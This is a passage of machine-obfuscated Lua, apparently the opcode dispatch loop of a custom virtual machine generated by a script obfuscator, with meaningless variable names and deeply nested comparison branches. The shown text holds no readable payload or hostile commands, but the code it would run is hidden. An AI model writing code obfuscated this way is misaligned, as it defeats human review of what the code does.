ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];ba=y[131]x={w[ba](w[ba+1])};q=0;for bb=ba,y[784]do q=q+1;w[bb]=x[q];end end;elseif z<192 then local q;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]]*y[784];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))else local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))end;elseif z<=288 then if z<=240 then if z<=216 then if(204>z or 204==z)then if(z==198 or z<198)then if(195==z or 195>z)then if(193==z or 193>z)then local q,x=0 while true do if q<=15 then if q<=7 then if q<=3 then if q<=1 then if q>0 then w={};else x=nil end else if q>2 then n=n+1;else for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;end end else if q<=5 then if 4<q then w[y[131]]=h[y[834]];else y=f[n];end else if 6<q then y=f[n];else n=n+1;end end end else if q<=11 then if q<=9 then if q>8 then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if q<11 then y=f[n];else w[y[131]]=j[y[834]];end end else if q<=13 then if q~=13 then n=n+1;else y=f[n];end else if q~=15 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end end else if q<=23 then if q<=19 then if q<=17 then if q~=17 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if 19~=q then n=n+1;else y=f[n];end end else if q<=21 then if q~=21 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if 23~=q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if q<=27 then if q<=25 then if 25~=q then n=n+1;else y=f[n];end else if 26==q then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=29 then if 29~=q then y=f[n];else x=y[131]end else if q>30 then break else w[x]=w[x](r(w,x+1,y[834]))end end end end end q=q+1 end elseif(195~=z)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[131]]=j[y[834]];end else if 2<q then y=f[n];else n=n+1;end end else if q<=5 then if q==4 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if q>6 then w[y[131]]=h[y[834]];else y=f[n];end end end else if q<=11 then if q<=9 then if 9~=q then n=n+1;else y=f[n];end else if q==10 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=13 then if q<13 then y=f[n];else x=y[131]end else if q>14 then break else w[x]=w[x](w[x+1])end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q>0 then ba=nil else x=nil end else if q<=2 then bb=nil else if q>3 then n=n+1;else w[y[131]]=h[y[834]];end end end else if q<=6 then if q==5 then y=f[n];else w[y[131]]=h[y[834]];end else if q<=7 then n=n+1;else if q~=9 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if q~=11 then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 13==q then n=n+1;else y=f[n];end end end else if q<=16 then if 15<q then ba={w[bb](w[bb+1])};else bb=y[131]end else if q<=17 then x=0;else if 18==q then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end end;elseif(196>z or 196==z)then local q,x=0 while true do if q<=13 then if q<=6 then if q<=2 then if q<=0 then x=nil else if q>1 then n=n+1;else w[y[131]]={};end end else if q<=4 then if q==3 then y=f[n];else w[y[131]]=h[y[834]];end else if 5<q then y=f[n];else n=n+1;end end end else if q<=9 then if q<=7 then w[y[131]]=w[y[834]][y[784]];else if q==8 then n=n+1;else y=f[n];end end else if q<=11 then if 10<q then n=n+1;else w[y[131]][y[834]]=w[y[784]];end else if 12==q then y=f[n];else w[y[131]]=j[y[834]];end end end end else if q<=20 then if q<=16 then if q<=14 then n=n+1;else if q<16 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if q<=18 then if 18~=q then n=n+1;else y=f[n];end else if 19<q then n=n+1;else w[y[131]]=j[y[834]];end end end else if q<=23 then if q<=21 then y=f[n];else if q==22 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=25 then if q<25 then y=f[n];else x=y[131]end else if 26==q then w[x]=w[x]()else break end end end end end q=q+1 end elseif z<198 then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0<q then w[y[131]]=h[y[834]];else x=nil end else if 2<q then y=f[n];else n=n+1;end end else if q<=5 then if q>4 then n=n+1;else w[y[131]]=y[834];end else if 7~=q then y=f[n];else w[y[131]]=y[834];end end end else if q<=11 then if q<=9 then if q>8 then y=f[n];else n=n+1;end else if q<11 then w[y[131]]=y[834];else n=n+1;end end else if q<=13 then if 13~=q then y=f[n];else x=y[131]end else if q<15 then w[x]=w[x](r(w,x+1,y[834]))else break end end end end q=q+1 end else if(w[y[131]]~=y[784])then n=n+1;else n=y[834];end;end;elseif 201>=z then if 199>=z then if w[y[131]]then n=(n+1);else n=y[834];end;elseif 201>z then local q=y[131]local x={w[q](r(w,q+1,y[834]))};local ba=0;for bb=q,y[784]do ba=ba+1;w[bb]=x[ba];end;else local q=y[131]local x={w[q](r(w,q+1,p))};local ba=0;for bb=q,y[784]do ba=(ba+1);w[bb]=x[ba];end end;elseif(202>=z)then local q=y[131]w[q](r(w,q+1,y[834]))elseif not(z~=203)then local q,x=0 while true do if q<=16 then if q<=7 then if q<=3 then if q<=1 then if 1>q then x=nil else w[y[131]]=w[y[834]][y[784]];end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if 5>q then w[y[131]]=h[y[834]];else n=n+1;end else if q<7 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if q<=11 then if q<=9 then if q~=9 then n=n+1;else y=f[n];end else if 10<q then n=n+1;else w[y[131]]={};end end else if q<=13 then if q<13 then y=f[n];else w[y[131]]=h[y[834]];end else if q<=14 then n=n+1;else if 15<q then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end end end else if q<=24 then if q<=20 then if q<=18 then if 17<q then y=f[n];else n=n+1;end else if 20>q then w[y[131]]=h[y[834]];else n=n+1;end end else if q<=22 then if q>21 then w[y[131]]={};else y=f[n];end else if q>23 then y=f[n];else n=n+1;end end end else if q<=28 then if q<=26 then if q>25 then n=n+1;else w[y[131]]=h[y[834]];end else if 27<q then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end else if q<=30 then if q>29 then y=f[n];else n=n+1;end else if q<=31 then x=y[131]else if 32<q then break else w[x]=w[x]()end end end end end end q=q+1 end else local q=(w[y[131]]+y[784]);w[y[131]]=q;if(q<=w[y[131]+1])then n=y[834];end;end;elseif(z<210 or z==210)then if(z<207 or z==207)then if(205==z or 205>z)then local q,x,ba,bb=0 while true do if(q<=9)then if q<=4 then if(q==1 or q<1)then if not(q~=0)then x=nil else ba=nil end else if(q<=2)then bb=nil else if 3==q then w[y[131]]=j[y[834]];else n=n+1;end end end else if(q==6 or q<6)then if 6~=q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if(q==7 or q<7)then n=(n+1);else if 8==q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if(q==14 or q<14)then if q<=11 then if not(q~=10)then n=n+1;else y=f[n];end else if(q==12 or q<12)then w[y[131]]=w[y[834]][y[784]];else if not(q==14)then n=n+1;else y=f[n];end end end else if(q<=16)then if 15<q then ba={w[bb](w[bb+1])};else bb=y[131]end else if(q==17 or q<17)then x=0;else if q<19 then for bc=bb,y[784]do x=(x+1);w[bc]=ba[x];end else break end end end end end q=q+1 end elseif(207>z)then local q,x=0 while true do if(q==7 or q<7)then if q<=3 then if(q<1 or q==1)then if(0<q)then w[y[131]]=w[y[834]];else x=nil end else if 3>q then n=(n+1);else y=f[n];end end else if(q<5 or q==5)then if(q==4)then w[y[131]]=y[834];else n=n+1;end else if not(q==7)then y=f[n];else w[y[131]]=y[834];end end end else if(q<=11)then if(q==9 or q<9)then if not(q~=8)then n=n+1;else y=f[n];end else if(10<q)then n=(n+1);else w[y[131]]=y[834];end end else if(q<13 or q==13)then if not(q~=12)then y=f[n];else x=y[131]end else if q==14 then w[x]=w[x](r(w,(x+1),y[834]))else break end end end end q=q+1 end else local q,x=0 while true do if(q<8 or q==8)then if(q<3 or q==3)then if(q<1 or q==1)then if not(1==q)then x=nil else w[y[131]]=w[y[834]][y[784]];end else if(2==q)then n=n+1;else y=f[n];end end else if(q<5 or q==5)then if(q<5)then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end else if q<=6 then y=f[n];else if 8~=q then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end end end end else if q<=13 then if(q==10 or q<10)then if(9<q)then w[y[131]]=w[y[834]][y[784]];else y=f[n];end else if(q<11 or q==11)then n=(n+1);else if q==12 then y=f[n];else w[y[131]]=false;end end end else if(q==15 or q<15)then if not(14~=q)then n=n+1;else y=f[n];end else if q<=16 then x=y[131]else if 17<q then break else w[x](w[x+1])end end end end end q=q+1 end end;elseif(208>z or 208==z)then local q=0 while true do if(q<=9)then if(q<=4)then if q<=1 then if(q<1)then w[y[131]]={};else n=n+1;end else if(q<2 or q==2)then y=f[n];else if q>3 then n=n+1;else w[y[131]]={};end end end else if q<=6 then if not(q==6)then y=f[n];else w[y[131]]={};end else if(q==7 or q<7)then n=(n+1);else if(q==8)then y=f[n];else w[y[131]]={};end end end end else if(q==14 or q<14)then if(q<=11)then if(q>10)then y=f[n];else n=n+1;end else if(q<=12)then w[y[131]]={};else if(13<q)then y=f[n];else n=(n+1);end end end else if q<=16 then if(q>15)then n=(n+1);else w[y[131]]=y[834];end else if(q==17 or q<17)then y=f[n];else if not(q~=18)then w[y[131]]=w[y[834]][w[y[784]]];else break end end end end end q=(q+1)end elseif(210>z)then w[y[131]]=(w[y[834]]%w[y[784]]);else local q=0 while true do if(q<=9)then if q<=4 then if(q<=1)then if(q==0)then w[y[131]][y[834]]=y[784];else n=(n+1);end else if(q<2 or q==2)then y=f[n];else if not(3~=q)then w[y[131]]={};else n=(n+1);end end end else if q<=6 then if q<6 then y=f[n];else w[y[131]][y[834]]=w[y[784]];end else if q<=7 then n=n+1;else if q>8 then w[y[131]]=h[y[834]];else y=f[n];end end end end else if(q==14 or q<14)then if(q<11 or q==11)then if 10==q then n=(n+1);else y=f[n];end else if(q<12 or q==12)then w[y[131]]=w[y[834]][y[784]];else if 13<q then y=f[n];else n=n+1;end end end else if(q<=16)then if(16~=q)then w[y[131]][y[834]]=w[y[784]];else n=(n+1);end else if(q<=17)then y=f[n];else if(18<q)then break else w[y[131]][y[834]]=w[y[784]];end end end end end q=(q+1)end end;elseif(z<=213)then if 211>=z then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0<q then ba=nil else x=nil end else if q<=2 then bb=nil else if q==3 then w[y[131]]=j[y[834]];else n=n+1;end end end else if q<=6 then if q~=6 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if 10==q then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][y[784]];else if 14>q then n=n+1;else y=f[n];end end end else if q<=16 then if q==15 then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q==18 then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end elseif 212==z then local q,x=0 while true do if q<=16 then if q<=7 then if q<=3 then if q<=1 then if 1>q then x=nil else w[y[131]]=w[y[834]][y[784]];end else if 3~=q then n=n+1;else y=f[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[131]]=h[y[834]];end else if 6<q then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end else if q<=11 then if q<=9 then if q<9 then n=n+1;else y=f[n];end else if q<11 then w[y[131]]={};else n=n+1;end end else if q<=13 then if 12<q then w[y[131]]=h[y[834]];else y=f[n];end else if q<=14 then n=n+1;else if q~=16 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end end else if q<=24 then if q<=20 then if q<=18 then if 18~=q then n=n+1;else y=f[n];end else if 19<q then n=n+1;else w[y[131]]=h[y[834]];end end else if q<=22 then if q~=22 then y=f[n];else w[y[131]]={};end else if 24>q then n=n+1;else y=f[n];end end end else if q<=28 then if q<=26 then if 25==q then w[y[131]]=h[y[834]];else n=n+1;end else if 28~=q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if q<=30 then if q<30 then n=n+1;else y=f[n];end else if q<=31 then x=y[131]else if q>32 then break else w[x]=w[x]()end end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q==0 then x=nil else ba=nil end else if q<=2 then bb=nil else if q>3 then n=n+1;else w[y[131]]=h[y[834]];end end end else if q<=6 then if q~=6 then y=f[n];else w[y[131]]=h[y[834]];end else if q<=7 then n=n+1;else if 9>q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if q<11 then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if q~=14 then n=n+1;else y=f[n];end end end else if q<=16 then if 16~=q then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q==18 then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end end;elseif(z<214 or z==214)then w[y[131]][y[834]]=w[y[784]];elseif z==215 then local q=0 while true do if q<=18 then if q<=8 then if q<=3 then if q<=1 then if 1>q then w[y[131]]=j[y[834]];else n=n+1;end else if 2==q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if q<=5 then if 5~=q then n=n+1;else y=f[n];end else if q<=6 then w[y[131]]=j[y[834]];else if q>7 then y=f[n];else n=n+1;end end end end else if q<=13 then if q<=10 then if q==9 then w[y[131]]=j[y[834]];else n=n+1;end else if q<=11 then y=f[n];else if 12==q then w[y[131]]=j[y[834]];else n=n+1;end end end else if q<=15 then if 14<q then w[y[131]]=j[y[834]];else y=f[n];end else if q<=16 then n=n+1;else if 17==q then y=f[n];else w[y[131]]=j[y[834]];end end end end end else if q<=27 then if q<=22 then if q<=20 then if 19<q then y=f[n];else n=n+1;end else if q<22 then w[y[131]]=j[y[834]];else n=n+1;end end else if q<=24 then if q~=24 then y=f[n];else w[y[131]]=j[y[834]];end else if q<=25 then n=n+1;else if 27>q then y=f[n];else w[y[131]]=j[y[834]];end end end end else if q<=32 then if q<=29 then if q==28 then n=n+1;else y=f[n];end else if q<=30 then w[y[131]]={};else if q<32 then n=n+1;else y=f[n];end end end else if q<=34 then if q<34 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if q<=35 then y=f[n];else if q==36 then if not w[y[131]]then n=n+1;else n=y[834];end;else break end end end end end end q=q+1 end else h[y[834]]=w[y[131]];end;elseif z<=228 then if z<=222 then if z<=219 then if z<=217 then local q=y[131]local x,ba=i(w[q](w[q+1]))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;elseif z~=219 then w[y[131]]=j[y[834]];else local q;w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=y[784];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))end;elseif z<=220 then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0<q then w[y[131]][y[834]]=w[y[784]];else x=nil end else if 2<q then y=f[n];else n=n+1;end end else if q<=5 then if q>4 then n=n+1;else w[y[131]]={};end else if q>6 then w[y[131]][y[834]]=y[784];else y=f[n];end end end else if q<=11 then if q<=9 then if q~=9 then n=n+1;else y=f[n];end else if q>10 then n=n+1;else w[y[131]][y[834]]=w[y[784]];end end else if q<=13 then if q>12 then x=y[131]else y=f[n];end else if q~=15 then w[x]=w[x](r(w,x+1,y[834]))else break end end end end q=q+1 end elseif z<222 then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];n=y[834];else local q;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))end;elseif z<=225 then if 223>=z then local q,x=0 while true do if q<=11 then if q<=5 then if q<=2 then if q<=0 then x=nil else if 2>q then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=3 then y=f[n];else if 4==q then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=8 then if q<=6 then y=f[n];else if q==7 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=9 then y=f[n];else if q==10 then w[y[131]]=h[y[834]];else n=n+1;end end end end else if q<=17 then if q<=14 then if q<=12 then y=f[n];else if 13==q then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=15 then y=f[n];else if q==16 then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=20 then if q<=18 then y=f[n];else if q==19 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=22 then if 21==q then y=f[n];else x=y[131]end else if 24~=q then w[x]=w[x](r(w,x+1,y[834]))else break end end end end end q=q+1 end elseif z~=225 then w[y[131]]=y[834];else local q;local x;local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];ba=y[131]x={w[ba](w[ba+1])};q=0;for bb=ba,y[784]do q=q+1;w[bb]=x[q];end end;elseif z<=226 then local q;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))elseif 228>z then a(c,e);n=n+1;y=f[n];w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];else local q;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))end;elseif 234>=z then if z<=231 then if z<=229 then local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))elseif 231>z then local q;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];q=y[131]w[q]=w[q](w[q+1])else w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];if(w[y[131]]~=y[784])then n=n+1;else n=y[834];end;end;elseif z<=232 then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1>q then x=nil else ba=nil end else if q<=2 then bb=nil else if q==3 then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=6 then if q~=6 then y=f[n];else w[y[131]]=h[y[834]];end else if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if q<11 then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if q>13 then y=f[n];else n=n+1;end end end else if q<=16 then if 16~=q then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q~=19 then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end elseif 233<z then w[y[131]]=true;else local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))end;elseif 237>=z then if 235>=z then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 1>q then x=nil else w[y[131]]=h[y[834]];end else if 2==q then n=n+1;else y=f[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if 7~=q then y=f[n];else w[y[131]]=y[834];end end end else if q<=11 then if q<=9 then if q<9 then n=n+1;else y=f[n];end else if q==10 then w[y[131]]=y[834];else n=n+1;end end else if q<=13 then if 12<q then x=y[131]else y=f[n];end else if q<15 then w[x]=w[x](r(w,x+1,y[834]))else break end end end end q=q+1 end elseif not(z==237)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if q~=4 then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=6 then if q<6 then y=f[n];else w[y[131]]=h[y[834]];end else if q<=7 then n=n+1;else if 9>q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if 10==q then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if q~=14 then n=n+1;else y=f[n];end end end else if q<=16 then if q==15 then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q>18 then break else for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end else n=y[834];end;elseif z<=238 then local q;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=false;n=n+1;y=f[n];q=y[131]w[q](w[q+1])elseif z~=240 then local q;local x,ba;local bb;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];bb=y[131]x,ba=i(w[bb](r(w,bb+1,y[834])))p=ba+bb-1 q=0;for ba=bb,p do q=q+1;w[ba]=x[q];end;else local q=d[y[834]];local x={};local ba={};for bb=1,y[784]do n=n+1;local bc=f[n];if bc[250]==365 then ba[bb-1]={w,bc[834]};else ba[bb-1]={h,bc[834]};end;v[#v+1]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(bb,bb)local bb=ba[bb];return bb[1][bb[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bb,bb,bc)local ba=ba[bb]ba[1][ba[2]]=bc;end;});w[y[131]]=b(q,x,j);end;elseif 264>=z then if(z<=252)then if(z==246 or z<246)then if(243>=z)then if(z<241 or z==241)then w[y[131]]=(not w[y[834]]);elseif(242<z)then w[y[131]]=true;else local q,x=0 while true do if q<=7 then if(q==3 or q<3)then if(q==1 or q<1)then if q<1 then x=nil else w[y[131]]=h[y[834]];end else if not(q==3)then n=n+1;else y=f[n];end end else if q<=5 then if not(4~=q)then w[y[131]]=y[834];else n=n+1;end else if not(6~=q)then y=f[n];else w[y[131]]=y[834];end end end else if q<=11 then if q<=9 then if 9>q then n=(n+1);else y=f[n];end else if(q<11)then w[y[131]]=y[834];else n=n+1;end end else if q<=13 then if q~=13 then y=f[n];else x=y[131]end else if 14<q then break else w[x]=w[x](r(w,(x+1),y[834]))end end end end q=q+1 end end;elseif(244==z or 244>z)then local q=y[131];do return w[q](r(w,q+1,y[834]))end;elseif(245<z)then local q=y[131];do return w[q],w[(q+1)]end else local q,x=0 while true do if(q<=11)then if q<=5 then if q<=2 then if(q<=0)then x=nil else if 2>q then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if(q<3 or q==3)then y=f[n];else if 5>q then w[y[131]][y[834]]=w[y[784]];else n=(n+1);end end end else if(q==8 or q<8)then if q<=6 then y=f[n];else if q~=8 then w[y[131]]=j[y[834]];else n=(n+1);end end else if q<=9 then y=f[n];else if q~=11 then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end end end end else if(q<=17)then if(q==14 or q<14)then if q<=12 then y=f[n];else if q>13 then n=(n+1);else w[y[131]]=h[y[834]];end end else if(q==15 or q<15)then y=f[n];else if(q<17)then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end else if(q<=20)then if(q==18 or q<18)then y=f[n];else if(19<q)then n=(n+1);else w[y[131]]=w[y[834]];end end else if(q<22 or q==22)then if 22>q then y=f[n];else x=y[131]end else if 23==q then w[x](r(w,(x+1),y[834]))else break end end end end end q=(q+1)end end;elseif 249>=z then if z<=247 then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q==0 then x=nil else w[y[131]]=w[y[834]][y[784]];end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if q==4 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if q<=6 then y=f[n];else if q==7 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end end else if q<=13 then if q<=10 then if 10>q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if q<=11 then n=n+1;else if 13~=q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if q<=15 then if q>14 then y=f[n];else n=n+1;end else if q<=16 then x=y[131]else if 17<q then break else w[x]=w[x](w[x+1])end end end end end q=q+1 end elseif not(248~=z)then local q,x=0 while true do if q<=9 then if q<=4 then if q<=1 then if q~=1 then x=nil else w[y[131]]=w[y[834]][y[784]];end else if q<=2 then n=n+1;else if q~=4 then y=f[n];else w[y[131]]=y[834];end end end else if q<=6 then if q~=6 then n=n+1;else y=f[n];end else if q<=7 then w[y[131]]=h[y[834]];else if 8==q then n=n+1;else y=f[n];end end end end else if q<=14 then if q<=11 then if q==10 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if q<=12 then y=f[n];else if 14>q then x=y[131];else do return w[x](r(w,x+1,y[834]))end;end end end else if q<=16 then if 15==q then n=n+1;else y=f[n];end else if q<=17 then x=y[131];else if 18<q then break else do return r(w,x,p)end;end end end end end q=q+1 end else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q==0 then x=nil else w[y[131]]=h[y[834]];end else if q<3 then n=n+1;else y=f[n];end end else if q<=5 then if 4<q then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if q==6 then y=f[n];else w[y[131]]=y[834];end end end else if q<=11 then if q<=9 then if 8==q then n=n+1;else y=f[n];end else if 10<q then n=n+1;else w[y[131]]=y[834];end end else if q<=13 then if 13~=q then y=f[n];else x=y[131]end else if 15~=q then w[x]=w[x](r(w,x+1,y[834]))else break end end end end q=q+1 end end;elseif(250>z or 250==z)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q<1 then x=nil else w[y[131]]=w[y[834]][y[784]];end else if q==2 then n=n+1;else y=f[n];end end else if q<=5 then if q==4 then w[y[131]]=w[y[834]];else n=n+1;end else if q<7 then y=f[n];else w[y[131]]=h[y[834]];end end end else if q<=11 then if q<=9 then if q==8 then n=n+1;else y=f[n];end else if 10<q then n=n+1;else w[y[131]]=w[y[834]][y[784]];end end else if q<=13 then if q>12 then x=y[131]else y=f[n];end else if q==14 then w[x]=w[x](r(w,x+1,y[834]))else break end end end end q=q+1 end elseif(252~=z)then local q=y[131]w[q](r(w,(q+1),p))else local q,x,ba,bb,bc=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba,bb=nil end else if q<=2 then bc=nil else if q<4 then w[y[131]]=w[y[834]];else n=n+1;end end end else if q<=6 then if q~=6 then 